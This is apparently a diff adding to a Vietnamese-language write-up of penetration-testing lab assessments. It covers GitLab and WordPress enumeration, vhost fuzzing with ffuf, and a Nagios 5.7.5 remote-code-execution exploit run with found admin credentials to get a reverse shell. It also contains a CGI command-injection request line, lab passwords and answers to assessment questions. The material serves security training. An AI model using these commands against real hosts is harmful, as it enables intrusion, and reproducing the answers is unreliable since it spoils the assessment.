@@ -2102,3 +2102,143 @@ GET /cgi/cmd.bat?&dir+c:\windows\system32\curl.exe&&28afbc9529a8855939ff7d2d8ad9
 ```
 
 ![](images/152.png)
+
+
+# Attacking Common Applications - Skills Assessment II
+
+During an external penetration test for the company Inlanefreight, you come across a host that, at first glance, does not seem extremely interesting. At this point in the assessment, you have exhausted all options and hit several dead ends. Looking back through your enumeration notes, something catches your eye about this particular host. You also see a note that you don't recall about the `gitlab.inlanefreight.local` vhost.
+
+Performing deeper and iterative enumeration reveals several serious flaws. Enumerate the target carefully and answer all the questions below to complete the second part of the skills assessment.
+
+#### Questions
+
+vHosts needed for these questions:
+
+- `gitlab.inlanefreight.local`
+
++ 1  What is the URL of the WordPress instance?
+
+```
+http://blog.inlanefreight.local
+```
+
++ 1  What is the name of the public GitLab project?
+
+```
+Virtualhost
+```
+
++ 1  What is the FQDN of the third vhost?
+
+
+
++ 1  What application is running on this third vhost? (One word)
+
+
+
++ 1  What is the admin password to access this application?
+
+
+
++ 1  Obtain reverse shell access on the target and submit the contents of the flag.txt file.
+
+
+Truy cập vào `http://gitlab.inlanefreight.local:8180/users/sign_up`
+
+Tôi sẽ đăng kí một tài khoản.
+
+![](images/153.png)
+
+
+Không có  gì đặc biệt tại `/explore`
+
+![](images/154.png)
+
+Ngoại trừ thông tin đăng nhập mặc định được khởi tạo trong `http://gitlab.inlanefreight.local:8180/root/nagios-postgresql/-/blob/master/INSTALL` , tôi không chắc nó có thể sử dụng...
+
+![](images/159.png)
+
+Phiên bản dù đã cũ, nhưng không có nhiều thông tin về các lỗ hổng bảo mật.
+
+![](images/155.png)
+
+Tôi sẽ thử liệt kê người dùng.
+
+```zsh
+python3 gitlab_userenum.py --url http://gitlab.inlanefreight.local:8180/ --wordlist /usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt
+```
+
+Song song với đó, tại web service cổng 80, có một liên kết cần xem xét.
+
+![](images/156.png)
+
+![](images/157.png)
+
+Trang web này sử dụng `wordpress version 5.8`...
+
+![](images/158.png)
+
+
+
+Về FQDN, tôi sử dụng công cụ `ffuf` để liệt kê.
+
+```zsh
+ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://inlanefreight.local/ -H "Host: FUZZ.inlanefreight.local" -fs 46166
+```
+
+![](images/160.png)
+
+
+Tại vhost này, `nagios` đang được triển khai.
+
+![](images/161.png)
+
+Trở lại phần trên, chúng ta đã có được thông tin đăng nhập khi tìm kiếm trong `gitlab`
+
+```
+nagiosadmin WITH PASSWORD 'oilaKglm7M09@CPL&^lC';
+```
+
+Giao diện trang quản trị:
+
+![](images/162.png)
+
+Phiên bản `nagios` là 5.7.5
+
+![](images/163.png)
+
+Phiên bản này có thể khai thác để thực thi mã từ xa với thông tin xác thực cần thiết mà chúng ta đã có.
+
+![](images/164.png)
+
+Dễ dàng có được Reverse Shell
+
+```zsh
+python3 49422.py http://monitoring.inlanefreight.local/ nagiosadmin 'oilaKglm7M09@CPL&^lC' 10.10.15.171 1234
+```
+
+![](images/165.png)
+
+# Attacking Common Applications - Skills Assessment III
+
+---
+
+During our penetration test our team found a Windows host running on the network and the corresponding credentials for the Administrator. It is required that we connect to the host and find the `hardcoded password` for the MSSQL service.
+
+
+#### Questions
+ RDP to  with user "Administrator" and password "xcyj8izxNVzhf4z"
+
++ 0  What is the hardcoded password for the database connection in the MultimasterAPI.dll file?
+
+Vị trí file .dll mà ta cần tìm.
+
+![](images/166.png)
+
+Mở với dnspy.
+
+Tại đây, chúng ta có thể thấy mật khẩu cần tìm để truy vấn từ cơ sở dữ liệu.
+
+![](images/167.png)
+
+![](images/168.png)
